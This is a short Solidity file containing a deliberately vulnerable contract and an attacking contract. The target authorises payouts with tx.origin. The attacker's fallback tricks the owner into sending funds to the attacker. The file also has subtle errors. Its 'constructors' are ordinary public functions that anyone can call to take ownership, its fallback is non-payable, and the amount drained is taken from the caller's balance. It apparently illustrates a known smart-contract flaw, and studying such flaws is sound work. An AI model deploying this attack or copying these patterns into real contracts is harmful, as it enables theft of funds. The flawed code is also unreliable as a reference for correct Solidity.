// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

contract MyContract {

    address owner;

    function myContract() public {
        owner = msg.sender;
    }

    function sendTo(address payable receiver, uint amount) public {
        require(tx.origin == owner);
        (bool success, ) = receiver.call{value:amount}("");
        require(success);
    }

}

contract AttackingContract {

    MyContract myContract;
    address payable attacker;

    function attackingContract(address myContractAddress) public {
        myContract = MyContract(myContractAddress);
        attacker = payable(msg.sender);
    }

    fallback() external {
        myContract.sendTo(attacker, msg.sender.balance);
    }

}
